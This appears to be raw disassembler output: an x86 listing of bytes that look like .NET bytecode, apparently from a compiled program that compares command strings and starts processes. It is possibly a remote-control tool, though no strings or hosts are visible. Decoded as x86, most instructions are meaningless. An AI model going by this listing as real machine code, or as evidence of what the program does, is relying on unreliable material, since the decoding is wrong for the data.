  4036b4:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4036bb:	28 00                	sub    %al,(%eax)
  4036bd:	00 01                	add    %al,(%ecx)
  4036bf:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4036c2:	00 0a                	add    %cl,(%edx)
  4036c4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4036c7:	00 0a                	add    %cl,(%edx)
  4036c9:	74 28                	je     0x4036f3
  4036cb:	00 00                	add    %al,(%eax)
  4036cd:	01 80 0a 00 00 04    	add    %eax,0x400000a(%eax)
  4036d3:	17                   	pop    %ss
  4036d4:	80 0d 00 00 04 38 ca 	orb    $0xca,0x38040000
  4036db:	26 00 00             	add    %al,%es:(%eax)
  4036de:	11 23                	adc    %esp,(%ebx)
  4036e0:	72 9d                	jb     0x40367f
  4036e2:	03 00                	add    (%eax),%eax
  4036e4:	70 16                	jo     0x4036fc
  4036e6:	28 69 00             	sub    %ch,0x0(%ecx)
  4036e9:	00 0a                	add    %cl,(%edx)
  4036eb:	16                   	push   %ss
  4036ec:	40                   	inc    %eax
  4036ed:	bb 00 00 00 06       	mov    $0x6000000,%ebx
  4036f2:	7b 28                	jnp    0x40371c
  4036f4:	00 00                	add    %al,(%eax)
  4036f6:	04 17                	add    $0x17,%al
  4036f8:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4036ff:	72 a5                	jb     0x4036a6
  403701:	03 00                	add    (%eax),%eax
  403703:	70 18                	jo     0x40371d
  403705:	8d 03                	lea    (%ebx),%eax
  403707:	00 00                	add    %al,(%eax)
  403709:	01 13                	add    %edx,(%ebx)
  40370b:	25 11 25 16 06       	and    $0x6162511,%eax
  403710:	7b 28                	jnp    0x40373a
  403712:	00 00                	add    %al,(%eax)
  403714:	04 13                	add    $0x13,%al
  403716:	29 11                	sub    %edx,(%ecx)
  403718:	29 18                	sub    %ebx,(%eax)
  40371a:	13 2a                	adc    (%edx),%ebp
  40371c:	11 2a                	adc    %ebp,(%edx)
  40371e:	9a a2 11 25 17 06 7b 	lcall  $0x7b06,$0x172511a2
  403725:	28 00                	sub    %al,(%eax)
  403727:	00 04 13             	add    %al,(%ebx,%edx,1)
  40372a:	27                   	daa
  40372b:	11 27                	adc    %esp,(%edi)
  40372d:	19 13                	sbb    %edx,(%ebx)
  40372f:	28 11                	sub    %dl,(%ecx)
  403731:	28 9a a2 11 25 13    	sub    %bl,0x132511a2(%edx)
  403737:	24 11                	and    $0x11,%al
  403739:	24 14                	and    $0x14,%al
  40373b:	14 18                	adc    $0x18,%al
  40373d:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  403740:	00 01                	add    %al,(%ecx)
  403742:	13 26                	adc    (%esi),%esp
  403744:	11 26                	adc    %esp,(%esi)
  403746:	16                   	push   %ss
  403747:	17                   	pop    %ss
  403748:	9c                   	pushf
  403749:	11 26                	adc    %esp,(%esi)
  40374b:	17                   	pop    %ss
  40374c:	17                   	pop    %ss
  40374d:	9c                   	pushf
  40374e:	11 26                	adc    %esp,(%esi)
  403750:	17                   	pop    %ss
  403751:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403755:	0a 26                	or     (%esi),%ah
  403757:	11 26                	adc    %esp,(%esi)
  403759:	16                   	push   %ss
  40375a:	90                   	nop
  40375b:	2c 22                	sub    $0x22,%al
  40375d:	11 29                	adc    %ebp,(%ecx)
  40375f:	11 2a                	adc    %ebp,(%edx)
  403761:	11 24 16             	adc    %esp,(%esi,%edx,1)
  403764:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40376b:	28 00                	sub    %al,(%eax)
  40376d:	00 01                	add    %al,(%ecx)
  40376f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  403772:	00 0a                	add    %cl,(%edx)
  403774:	28 6d 00             	sub    %ch,0x0(%ebp)
  403777:	00 0a                	add    %cl,(%edx)
  403779:	74 28                	je     0x4037a3
  40377b:	00 00                	add    %al,(%eax)
  40377d:	01 a2 11 26 17 90    	add    %esp,-0x6fe8d9ef(%edx)
  403783:	2c 22                	sub    $0x22,%al
  403785:	11 27                	adc    %esp,(%edi)
  403787:	11 28                	adc    %ebp,(%eax)
  403789:	11 24 17             	adc    %esp,(%edi,%edx,1)
  40378c:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  403793:	28 00                	sub    %al,(%eax)
  403795:	00 01                	add    %al,(%ecx)
  403797:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40379a:	00 0a                	add    %cl,(%edx)
  40379c:	28 6d 00             	sub    %ch,0x0(%ebp)
  40379f:	00 0a                	add    %cl,(%edx)
  4037a1:	74 28                	je     0x4037cb
  4037a3:	00 00                	add    %al,(%eax)
  4037a5:	01 a2 38 fc 25 00    	add    %esp,0x25fc38(%edx)
  4037ab:	00 11                	add    %dl,(%ecx)
  4037ad:	23 72 b1             	and    -0x4f(%edx),%esi
  4037b0:	03 00                	add    (%eax),%eax
  4037b2:	70 16                	jo     0x4037ca
  4037b4:	28 69 00             	sub    %ch,0x0(%ecx)
  4037b7:	00 0a                	add    %cl,(%edx)
  4037b9:	16                   	push   %ss
  4037ba:	33 28                	xor    (%eax),%ebp
  4037bc:	06                   	push   %es
  4037bd:	7b 28                	jnp    0x4037e7
  4037bf:	00 00                	add    %al,(%eax)
  4037c1:	04 17                	add    $0x17,%al
  4037c3:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4037ca:	72 bf                	jb     0x40378b
  4037cc:	03 00                	add    (%eax),%eax
  4037ce:	70 16                	jo     0x4037e6
  4037d0:	8d 03                	lea    (%ebx),%eax
  4037d2:	00 00                	add    %al,(%eax)
  4037d4:	01 14 14             	add    %edx,(%esp,%edx,1)
  4037d7:	14 17                	adc    $0x17,%al
  4037d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4037dd:	0a 26                	or     (%esi),%ah
  4037df:	38 c4                	cmp    %al,%ah
  4037e1:	25 00 00 11 23       	and    $0x23110000,%eax
  4037e6:	72 d9                	jb     0x4037c1
  4037e8:	03 00                	add    (%eax),%eax
  4037ea:	70 16                	jo     0x403802
  4037ec:	28 69 00             	sub    %ch,0x0(%ecx)
  4037ef:	00 0a                	add    %cl,(%edx)
  4037f1:	16                   	push   %ss
  4037f2:	33 28                	xor    (%eax),%ebp
  4037f4:	72 d9                	jb     0x4037cf
  4037f6:	03 00                	add    (%eax),%eax
  4037f8:	70 7e                	jo     0x403878
  4037fa:	19 00                	sbb    %eax,(%eax)
  4037fc:	00 04 28             	add    %al,(%eax,%ebp,1)
  4037ff:	71 00                	jno    0x403801
  403801:	00 0a                	add    %cl,(%edx)
  403803:	28 38                	sub    %bh,(%eax)
  403805:	00 00                	add    %al,(%eax)
  403807:	06                   	push   %es
  403808:	28 71 00             	sub    %dh,0x0(%ecx)
  40380b:	00 0a                	add    %cl,(%edx)
  40380d:	28 3b                	sub    %bh,(%ebx)
  40380f:	00 00                	add    %al,(%eax)
  403811:	0a 28                	or     (%eax),%ch
  403813:	1c 00                	sbb    $0x0,%al
  403815:	00 06                	add    %al,(%esi)
  403817:	38 8c 25 00 00 11 23 	cmp    %cl,0x23110000(%ebp,%eiz,1)
  40381e:	72 1f                	jb     0x40383f
  403820:	01 00                	add    %eax,(%eax)
  403822:	70 16                	jo     0x40383a
  403824:	28 69 00             	sub    %ch,0x0(%ecx)
  403827:	00 0a                	add    %cl,(%edx)
  403829:	16                   	push   %ss
  40382a:	40                   	inc    %eax
  40382b:	52                   	push   %edx
  40382c:	01 00                	add    %eax,(%eax)
  40382e:	00 73 83             	add    %dh,-0x7d(%ebx)
  403831:	00 00                	add    %al,(%eax)
  403833:	0a 13                	or     (%ebx),%dl
  403835:	09 11                	or     %edx,(%ecx)
  403837:	09 6f 84             	or     %ebp,-0x7c(%edi)
  40383a:	00 00                	add    %al,(%eax)
  40383c:	0a 72 e1             	or     -0x1f(%edx),%dh
  40383f:	03 00                	add    (%eax),%eax
  403841:	70 6f                	jo     0x4038b2
  403843:	85 00                	test   %eax,(%eax)
  403845:	00 0a                	add    %cl,(%edx)
  403847:	11 09                	adc    %ecx,(%ecx)
  403849:	6f                   	outsl  %ds:(%esi),(%dx)
  40384a:	84 00                	test   %al,(%eax)
  40384c:	00 0a                	add    %cl,(%edx)
  40384e:	72 fb                	jb     0x40384b
  403850:	03 00                	add    (%eax),%eax
  403852:	70 7e                	jo     0x4038d2
  403854:	1b 00                	sbb    (%eax),%eax
  403856:	00 04 28             	add    %al,(%eax,%ebp,1)
  403859:	56                   	push   %esi
  40385a:	00 00                	add    %al,(%eax)
  40385c:	0a 72 09             	or     0x9(%edx),%dh
  40385f:	04 00                	add    $0x0,%al
  403861:	70 28                	jo     0x40388b
  403863:	25 00 00 0a 6f       	and    $0x6f0a0000,%eax
  403868:	86 00                	xchg   %al,(%eax)
  40386a:	00 0a                	add    %cl,(%edx)
  40386c:	11 09                	adc    %ecx,(%ecx)
  40386e:	6f                   	outsl  %ds:(%esi),(%dx)
  40386f:	84 00                	test   %al,(%eax)
  403871:	00 0a                	add    %cl,(%edx)
  403873:	16                   	push   %ss
  403874:	6f                   	outsl  %ds:(%esi),(%dx)
  403875:	87 00                	xchg   %eax,(%eax)
  403877:	00 0a                	add    %cl,(%edx)
  403879:	11 09                	adc    %ecx,(%ecx)
  40387b:	6f                   	outsl  %ds:(%esi),(%dx)
  40387c:	84 00                	test   %al,(%eax)
  40387e:	00 0a                	add    %cl,(%edx)
  403880:	16                   	push   %ss
  403881:	6f                   	outsl  %ds:(%esi),(%dx)
  403882:	88 00                	mov    %al,(%eax)
  403884:	00 0a                	add    %cl,(%edx)
  403886:	11 09                	adc    %ecx,(%ecx)
  403888:	6f                   	outsl  %ds:(%esi),(%dx)
  403889:	84 00                	test   %al,(%eax)
  40388b:	00 0a                	add    %cl,(%edx)
  40388d:	16                   	push   %ss
  40388e:	6f                   	outsl  %ds:(%esi),(%dx)
  40388f:	89 00                	mov    %eax,(%eax)
  403891:	00 0a                	add    %cl,(%edx)
  403893:	11 09                	adc    %ecx,(%ecx)
  403895:	6f                   	outsl  %ds:(%esi),(%dx)
  403896:	84 00                	test   %al,(%eax)
  403898:	00 0a                	add    %cl,(%edx)
  40389a:	17                   	pop    %ss
  40389b:	6f                   	outsl  %ds:(%esi),(%dx)
  40389c:	8a 00                	mov    (%eax),%al
  40389e:	00 0a                	add    %cl,(%edx)
  4038a0:	11 09                	adc    %ecx,(%ecx)
  4038a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a3:	8b 00                	mov    (%eax),%eax
  4038a5:	00 0a                	add    %cl,(%edx)
  4038a7:	26 11 09             	adc    %ecx,%es:(%ecx)
  4038aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4038ab:	8c 00                	mov    %es,(%eax)
  4038ad:	00 0a                	add    %cl,(%edx)
  4038af:	de 0c 11             	fimuls (%ecx,%edx,1)
  4038b2:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  4038b5:	11 09                	adc    %ecx,(%ecx)
  4038b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b8:	59                   	pop    %ecx
  4038b9:	00 00                	add    %al,(%eax)
  4038bb:	0a dc                	or     %ah,%bl
  4038bd:	de 0f                	fimuls (%edi)
  4038bf:	25 28 29 00 00       	and    $0x2928,%eax
  4038c4:	0a 13                	or     (%ebx),%dl
  4038c6:	0a 28                	or     (%eax),%ch
  4038c8:	2a 00                	sub    (%eax),%al
  4038ca:	00 0a                	add    %cl,(%edx)
  4038cc:	de 00                	fiadds (%eax)
  4038ce:	73 83                	jae    0x403853
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 28                	or     (%eax),%ch
  4038d4:	25 00 00 06 28       	and    $0x28060000,%eax
  4038d9:	24 00                	and    $0x0,%al
  4038db:	00 06                	add    %al,(%esi)
  4038dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4038de:	84 00                	test   %al,(%eax)
  4038e0:	00 0a                	add    %cl,(%edx)
  4038e2:	13 2f                	adc    (%edi),%ebp
  4038e4:	11 2f                	adc    %ebp,(%edi)
  4038e6:	72 11                	jb     0x4038f9
  4038e8:	04 00                	add    $0x0,%al
  4038ea:	70 6f                	jo     0x40395b
  4038ec:	85 00                	test   %eax,(%eax)
  4038ee:	00 0a                	add    %cl,(%edx)
  4038f0:	11 2f                	adc    %ebp,(%edi)
  4038f2:	16                   	push   %ss
  4038f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f4:	87 00                	xchg   %eax,(%eax)
  4038f6:	00 0a                	add    %cl,(%edx)
  4038f8:	11 2f                	adc    %ebp,(%edi)
  4038fa:	17                   	pop    %ss
  4038fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4038fc:	8a 00                	mov    (%eax),%al
  4038fe:	00 0a                	add    %cl,(%edx)
  403900:	11 2f                	adc    %ebp,(%edi)
  403902:	17                   	pop    %ss
  403903:	6f                   	outsl  %ds:(%esi),(%dx)
  403904:	8d 00                	lea    (%eax),%eax
  403906:	00 0a                	add    %cl,(%edx)
  403908:	11 2f                	adc    %ebp,(%edi)
  40390a:	17                   	pop    %ss
  40390b:	6f                   	outsl  %ds:(%esi),(%dx)
  40390c:	89 00                	mov    %eax,(%eax)
  40390e:	00 0a                	add    %cl,(%edx)
  403910:	11 2f                	adc    %ebp,(%edi)
  403912:	17                   	pop    %ss
  403913:	6f                   	outsl  %ds:(%esi),(%dx)
  403914:	88 00                	mov    %al,(%eax)
  403916:	00 0a                	add    %cl,(%edx)
  403918:	14 13                	adc    $0x13,%al
  40391a:	2f                   	das
  40391b:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40391e:	00 06                	add    %al,(%esi)
  403920:	6f                   	outsl  %ds:(%esi),(%dx)
  403921:	8b 00                	mov    (%eax),%eax
  403923:	00 0a                	add    %cl,(%edx)
  403925:	26 28 24 00          	sub    %ah,%es:(%eax,%eax,1)
  403929:	00 06                	add    %al,(%esi)
  40392b:	6f                   	outsl  %ds:(%esi),(%dx)
  40392c:	8e 00                	mov    (%eax),%es
  40392e:	00 0a                	add    %cl,(%edx)
  403930:	80 1b 00             	sbbb   $0x0,(%ebx)
  403933:	00 04 28             	add    %al,(%eax,%ebp,1)
  403936:	24 00                	and    $0x0,%al
  403938:	00 06                	add    %al,(%esi)
  40393a:	6f                   	outsl  %ds:(%esi),(%dx)
  40393b:	8f 00                	pop    (%eax)
  40393d:	00 0a                	add    %cl,(%edx)
  40393f:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403942:	00 06                	add    %al,(%esi)
  403944:	6f                   	outsl  %ds:(%esi),(%dx)
  403945:	90                   	nop
  403946:	00 00                	add    %al,(%eax)
  403948:	0a 72 21             	or     0x21(%edx),%dh
  40394b:	04 00                	add    $0x0,%al
  40394d:	70 28                	jo     0x403977
  40394f:	24 00                	and    $0x0,%al
  403951:	00 06                	add    %al,(%esi)
  403953:	6f                   	outsl  %ds:(%esi),(%dx)
  403954:	91                   	xchg   %eax,%ecx
  403955:	00 00                	add    %al,(%eax)
  403957:	0a 13                	or     (%ebx),%dl
  403959:	30 12                	xor    %dl,(%edx)
  40395b:	30 28                	xor    %ch,(%eax)
  40395d:	92                   	xchg   %eax,%edx
  40395e:	00 00                	add    %al,(%eax)
  403960:	0a 28                	or     (%eax),%ch
  403962:	47                   	inc    %edi
  403963:	00 00                	add    %al,(%eax)
  403965:	0a 28                	or     (%eax),%ch
  403967:	26 00 00             	add    %al,%es:(%eax)
  40396a:	06                   	push   %es
  40396b:	de 0f                	fimuls (%edi)
  40396d:	25 28 29 00 00       	and    $0x2928,%eax
  403972:	0a 13                	or     (%ebx),%dl
  403974:	0b 28                	or     (%eax),%ebp
  403976:	2a 00                	sub    (%eax),%al
  403978:	00 0a                	add    %cl,(%edx)
  40397a:	de 00                	fiadds (%eax)
  40397c:	38 27                	cmp    %ah,(%edi)
  40397e:	24 00                	and    $0x0,%al
  403980:	00 11                	add    %dl,(%ecx)
  403982:	23 72 4b             	and    0x4b(%edx),%esi
  403985:	04 00                	add    $0x0,%al
  403987:	70 16                	jo     0x40399f
  403989:	28 69 00             	sub    %ch,0x0(%ecx)
  40398c:	00 0a                	add    %cl,(%edx)
  40398e:	16                   	push   %ss
  40398f:	33 2b                	xor    (%ebx),%ebp
  403991:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403994:	00 06                	add    %al,(%esi)
  403996:	6f                   	outsl  %ds:(%esi),(%dx)
  403997:	93                   	xchg   %eax,%ebx
  403998:	00 00                	add    %al,(%eax)
  40399a:	0a 06                	or     (%esi),%al
  40399c:	7b 28                	jnp    0x4039c6
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	04 17                	add    $0x17,%al
  4039a2:	9a 6f 94 00 00 0a 28 	lcall  $0x280a,$0x946f
  4039a9:	24 00                	and    $0x0,%al
  4039ab:	00 06                	add    %al,(%esi)
  4039ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ae:	93                   	xchg   %eax,%ebx
  4039af:	00 00                	add    %al,(%eax)
  4039b1:	0a 6f 95             	or     -0x6b(%edi),%ch
  4039b4:	00 00                	add    %al,(%eax)
  4039b6:	0a 38                	or     (%eax),%bh
  4039b8:	ec                   	in     (%dx),%al
  4039b9:	23 00                	and    (%eax),%eax
  4039bb:	00 11                	add    %dl,(%ecx)
  4039bd:	23 72 5d             	and    0x5d(%edx),%esi
  4039c0:	04 00                	add    $0x0,%al
  4039c2:	70 16                	jo     0x4039da
  4039c4:	28 69 00             	sub    %ch,0x0(%ecx)
  4039c7:	00 0a                	add    %cl,(%edx)
  4039c9:	16                   	push   %ss
  4039ca:	33 32                	xor    (%edx),%esi
  4039cc:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4039cf:	00 06                	add    %al,(%esi)
  4039d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d2:	93                   	xchg   %eax,%ebx
  4039d3:	00 00                	add    %al,(%eax)
  4039d5:	0a 72 73             	or     0x73(%edx),%dh
  4039d8:	04 00                	add    $0x0,%al
  4039da:	70 6f                	jo     0x403a4b
  4039dc:	94                   	xchg   %eax,%esp
  4039dd:	00 00                	add    %al,(%eax)
  4039df:	0a 28                	or     (%eax),%ch
  4039e1:	24 00                	and    $0x0,%al
  4039e3:	00 06                	add    %al,(%esi)
  4039e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4039e6:	93                   	xchg   %eax,%ebx
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f 95             	or     -0x6b(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 28                	or     (%eax),%ch
  4039f0:	24 00                	and    $0x0,%al
  4039f2:	00 06                	add    %al,(%esi)
  4039f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f5:	96                   	xchg   %eax,%esi
  4039f6:	00 00                	add    %al,(%eax)
  4039f8:	0a 38                	or     (%eax),%bh
  4039fa:	aa                   	stos   %al,%es:(%edi)
  4039fb:	23 00                	and    (%eax),%eax
  4039fd:	00 11                	add    %dl,(%ecx)
  4039ff:	23 72 7d             	and    0x7d(%edx),%esi
  403a02:	04 00                	add    $0x0,%al
  403a04:	70 16                	jo     0x403a1c
  403a06:	28 69 00             	sub    %ch,0x0(%ecx)
  403a09:	00 0a                	add    %cl,(%edx)
  403a0b:	16                   	push   %ss
  403a0c:	33 28                	xor    (%eax),%ebp
  403a0e:	72 7d                	jb     0x403a8d
  403a10:	04 00                	add    $0x0,%al
  403a12:	70 7e                	jo     0x403a92
  403a14:	19 00                	sbb    %eax,(%eax)
  403a16:	00 04 28             	add    %al,(%eax,%ebp,1)
  403a19:	66 00 00             	data16 add %al,(%eax)
  403a1c:	0a 28                	or     (%eax),%ch
  403a1e:	38 00                	cmp    %al,(%eax)
  403a20:	00 06                	add    %al,(%esi)
  403a22:	28 66 00             	sub    %ah,0x0(%esi)
  403a25:	00 0a                	add    %cl,(%edx)
  403a27:	28 3b                	sub    %bh,(%ebx)
  403a29:	00 00                	add    %al,(%eax)
  403a2b:	0a 28                	or     (%eax),%ch
  403a2d:	1c 00                	sbb    $0x0,%al
  403a2f:	00 06                	add    %al,(%esi)
  403a31:	38 72 23             	cmp    %dh,0x23(%edx)
  403a34:	00 00                	add    %al,(%eax)
  403a36:	11 23                	adc    %esp,(%ebx)
  403a38:	72 85                	jb     0x4039bf
  403a3a:	04 00                	add    $0x0,%al
  403a3c:	70 16                	jo     0x403a54
  403a3e:	28 69 00             	sub    %ch,0x0(%ecx)
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	16                   	push   %ss
  403a44:	40                   	inc    %eax
  403a45:	09 01                	or     %eax,(%ecx)
  403a47:	00 00                	add    %al,(%eax)
  403a49:	14 13                	adc    $0x13,%al
  403a4b:	0c 28                	or     $0x28,%al
  403a4d:	97                   	xchg   %eax,%edi
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	0a 13                	or     (%ebx),%dl
  403a52:	32 16                	xor    (%esi),%dl
  403a54:	13 31                	adc    (%ecx),%esi
  403a56:	38 9f 00 00 00 11    	cmp    %bl,0x11000000(%edi)
  403a5c:	32 11                	xor    (%ecx),%dl
  403a5e:	31 9a 13 0d 1e 8d    	xor    %ebx,-0x72e1f2ed(%edx)
  403a64:	28 00                	sub    %al,(%eax)
  403a66:	00 01                	add    %al,(%ecx)
  403a68:	13 29                	adc    (%ecx),%ebp
  403a6a:	11 29                	adc    %ebp,(%ecx)
  403a6c:	16                   	push   %ss
  403a6d:	11 0c a2             	adc    %ecx,(%edx,%eiz,4)
  403a70:	11 29                	adc    %ebp,(%ecx)
  403a72:	17                   	pop    %ss
  403a73:	11 0d 6f 98 00 00    	adc    %ecx,0x986f
  403a79:	0a 28                	or     (%eax),%ch
  403a7b:	99                   	cltd
  403a7c:	00 00                	add    %al,(%eax)
  403a7e:	0a a2 11 29 18 11    	or     0x11182911(%edx),%ah
  403a84:	0d 6f 1e 00 00       	or     $0x1e6f,%eax
  403a89:	0a 6f 1f             	or     0x1f(%edi),%ch
  403a8c:	00 00                	add    %al,(%eax)
  403a8e:	0a 6f 9a             	or     -0x66(%edi),%ch
  403a91:	00 00                	add    %al,(%eax)
  403a93:	0a 28                	or     (%eax),%ch
  403a95:	9b                   	fwait
  403a96:	00 00                	add    %al,(%eax)
  403a98:	0a a2 11 29 19 72    	or     0x72192911(%edx),%ah
  403a9e:	8b 04 00             	mov    (%eax,%eax,1),%eax
  403aa1:	70 a2                	jo     0x403a45
  403aa3:	11 29                	adc    %ebp,(%ecx)
  403aa5:	1a 11                	sbb    (%ecx),%dl
  403aa7:	0d 6f 8e 00 00       	or     $0x8e6f,%eax
  403aac:	0a 28                	or     (%eax),%ch
  403aae:	56                   	push   %esi
  403aaf:	00 00                	add    %al,(%eax)
  403ab1:	0a a2 11 29 1b 72    	or     0x721b2911(%edx),%ah
  403ab7:	8b 04 00             	mov    (%eax,%eax,1),%eax
  403aba:	70 a2                	jo     0x403a5e
  403abc:	11 29                	adc    %ebp,(%ecx)
  403abe:	1c 11                	sbb    $0x11,%al
  403ac0:	0d 6f 1e 00 00       	or     $0x1e6f,%eax
  403ac5:	0a 6f 1f             	or     0x1f(%edi),%ch
  403ac8:	00 00                	add    %al,(%eax)
  403aca:	0a 6f 9a             	or     -0x66(%edi),%ch
  403acd:	00 00                	add    %al,(%eax)
  403acf:	0a a2 11 29 1d 72    	or     0x721d2911(%edx),%ah
  403ad5:	97                   	xchg   %eax,%edi
  403ad6:	04 00                	add    $0x0,%al
  403ad8:	70 a2                	jo     0x403a7c
  403ada:	11 29                	adc    %ebp,(%ecx)
  403adc:	28 9c 00 00 0a 13 0c 	sub    %bl,0xc130a00(%eax,%eax,1)
  403ae3:	de 0f                	fimuls (%edi)
  403ae5:	25 28 29 00 00       	and    $0x2928,%eax
  403aea:	0a 13                	or     (%ebx),%dl
  403aec:	0e                   	push   %cs
  403aed:	28 2a                	sub    %ch,(%edx)
  403aef:	00 00                	add    %al,(%eax)
  403af1:	0a de                	or     %dh,%bl
  403af3:	00 11                	add    %dl,(%ecx)
  403af5:	31 17                	xor    %edx,(%edi)
  403af7:	d6                   	salc
  403af8:	13 31                	adc    (%ecx),%esi
  403afa:	11 31                	adc    %esi,(%ecx)
  403afc:	11 32                	adc    %esi,(%edx)
  403afe:	8e b7 3f 56 ff ff    	mov    -0xa9c1(%edi),%?
  403b04:	ff 72 85             	push   -0x7b(%edx)
  403b07:	04 00                	add    $0x0,%al
  403b09:	70 7e                	jo     0x403b89
  403b0b:	19 00                	sbb    %eax,(%eax)
  403b0d:	00 04 28             	add    %al,(%eax,%ebp,1)
  403b10:	71 00                	jno    0x403b12
  403b12:	00 0a                	add    %cl,(%edx)
  403b14:	11 0c 28             	adc    %ecx,(%eax,%ebp,1)
  403b17:	71 00                	jno    0x403b19
  403b19:	00 0a                	add    %cl,(%edx)
  403b1b:	7e 19                	jle    0x403b36
  403b1d:	00 00                	add    %al,(%eax)
  403b1f:	04 28                	add    $0x28,%al
  403b21:	71 00                	jno    0x403b23
  403b23:	00 0a                	add    %cl,(%edx)
  403b25:	7e 0e                	jle    0x403b35
  403b27:	00 00                	add    %al,(%eax)
  403b29:	04 7e                	add    $0x7e,%al
  403b2b:	19 00                	sbb    %eax,(%eax)
  403b2d:	00 04 28             	add    %al,(%eax,%ebp,1)
  403b30:	66 00 00             	data16 add %al,(%eax)
  403b33:	0a 28                	or     (%eax),%ch
  403b35:	38 00                	cmp    %al,(%eax)
  403b37:	00 06                	add    %al,(%esi)
  403b39:	28 66 00             	sub    %ah,0x0(%esi)
  403b3c:	00 0a                	add    %cl,(%edx)
  403b3e:	28 71 00             	sub    %dh,0x0(%ecx)
  403b41:	00 0a                	add    %cl,(%edx)
  403b43:	28 3b                	sub    %bh,(%ebx)
  403b45:	00 00                	add    %al,(%eax)
  403b47:	0a 28                	or     (%eax),%ch
  403b49:	1c 00                	sbb    $0x0,%al
  403b4b:	00 06                	add    %al,(%esi)
  403b4d:	38 56 22             	cmp    %dl,0x22(%esi)
  403b50:	00 00                	add    %al,(%eax)
  403b52:	11 23                	adc    %esp,(%ebx)
  403b54:	72 9f                	jb     0x403af5
  403b56:	04 00                	add    $0x0,%al
  403b58:	70 16                	jo     0x403b70
  403b5a:	28 69 00             	sub    %ch,0x0(%ecx)
  403b5d:	00 0a                	add    %cl,(%edx)
  403b5f:	16                   	push   %ss
  403b60:	33 1c 06             	xor    (%esi,%eax,1),%ebx
  403b63:	7b 28                	jnp    0x403b8d
  403b65:	00 00                	add    %al,(%eax)
  403b67:	04 17                	add    $0x17,%al
  403b69:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  403b70:	9d                   	popf
  403b71:	00 00                	add    %al,(%eax)
  403b73:	0a 6f 9e             	or     -0x62(%edi),%ch
  403b76:	00 00                	add    %al,(%eax)
  403b78:	0a 38                	or     (%eax),%bh
  403b7a:	2a 22                	sub    (%edx),%ah
  403b7c:	00 00                	add    %al,(%eax)
  403b7e:	11 23                	adc    %esp,(%ebx)
  403b80:	72 a9                	jb     0x403b2b
  403b82:	04 00                	add    $0x0,%al
  403b84:	70 16                	jo     0x403b9c
  403b86:	28 69 00             	sub    %ch,0x0(%ecx)
  403b89:	00 0a                	add    %cl,(%edx)
  403b8b:	16                   	push   %ss
  403b8c:	33 33                	xor    (%ebx),%esi
  403b8e:	06                   	push   %es
  403b8f:	7b 28                	jnp    0x403bb9
  403b91:	00 00                	add    %al,(%eax)
  403b93:	04 17                	add    $0x17,%al
  403b95:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  403b9c:	9d                   	popf
  403b9d:	00 00                	add    %al,(%eax)
  403b9f:	0a 6f 9e             	or     -0x62(%edi),%ch
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	0a 20                	or     (%eax),%ah
  403ba6:	f4                   	hlt
  403ba7:	01 00                	add    %eax,(%eax)
  403ba9:	00 28                	add    %ch,(%eax)
  403bab:	21 00                	and    %eax,(%eax)
  403bad:	00 0a                	add    %cl,(%edx)
  403baf:	06                   	push   %es
  403bb0:	7b 28                	jnp    0x403bda
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	04 18                	add    $0x18,%al
  403bb6:	9a 28 9f 00 00 0a 38 	lcall  $0x380a,$0x9f28
  403bbd:	e7 21                	out    %eax,$0x21
  403bbf:	00 00                	add    %al,(%eax)
  403bc1:	11 23                	adc    %esp,(%ebx)
  403bc3:	72 af                	jb     0x403b74
  403bc5:	04 00                	add    $0x0,%al
  403bc7:	70 16                	jo     0x403bdf
  403bc9:	28 69 00             	sub    %ch,0x0(%ecx)
  403bcc:	00 0a                	add    %cl,(%edx)
  403bce:	16                   	push   %ss
  403bcf:	33 34 06             	xor    (%esi,%eax,1),%esi
  403bd2:	7b 28                	jnp    0x403bfc
  403bd4:	00 00                	add    %al,(%eax)
  403bd6:	04 17                	add    $0x17,%al
  403bd8:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  403bdf:	9d                   	popf
  403be0:	00 00                	add    %al,(%eax)
  403be2:	0a 6f 9e             	or     -0x62(%edi),%ch
  403be5:	00 00                	add    %al,(%eax)
  403be7:	0a 20                	or     (%eax),%ah
  403be9:	f4                   	hlt
  403bea:	01 00                	add    %eax,(%eax)
  403bec:	00 28                	add    %ch,(%eax)
  403bee:	21 00                	and    %eax,(%eax)
  403bf0:	00 0a                	add    %cl,(%edx)
  403bf2:	06                   	push   %es
  403bf3:	7b 28                	jnp    0x403c1d
  403bf5:	00 00                	add    %al,(%eax)
  403bf7:	04 18                	add    $0x18,%al
  403bf9:	9a 28 7c 00 00 0a 26 	lcall  $0x260a,$0x7c28
